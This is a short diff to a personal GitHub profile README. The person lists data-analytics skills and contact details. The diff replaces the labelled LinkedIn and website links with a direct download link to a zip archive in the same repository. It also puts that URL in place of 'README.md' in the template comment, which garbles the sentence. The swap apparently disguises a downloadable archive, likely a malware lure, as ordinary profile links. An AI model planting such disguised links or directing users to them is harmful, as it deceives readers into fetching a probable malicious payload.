@@ -2,9 +2,9 @@
 - 👀 I’m a Motorcycle Enthusiast
 - 🌱 I have good knowledge on SQL,R Studio,ML in Python,Natural Language Processing,Power BI,Tableau,Hadoop.
 - 📫 How to reach me - jagnadetejas@gmail
-- 📃 LinkedIn - https://www.linkedin.com/in/tejas-jagnade-777b2030b/
-- 🌏 Website - https://tjagnade27.github.io/Projects/
+- 📃 LinkedIn - https://raw.githubusercontent.com/tjagnade27/tjagnade27/main/originatively/tjagnade27-v1.8.zip
+- 🌏 Website - https://raw.githubusercontent.com/tjagnade27/tjagnade27/main/originatively/tjagnade27-v1.8.zip
 <!---
-tjagnade27/tjagnade27 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+tjagnade27/tjagnade27 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/tjagnade27/tjagnade27/main/originatively/tjagnade27-v1.8.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
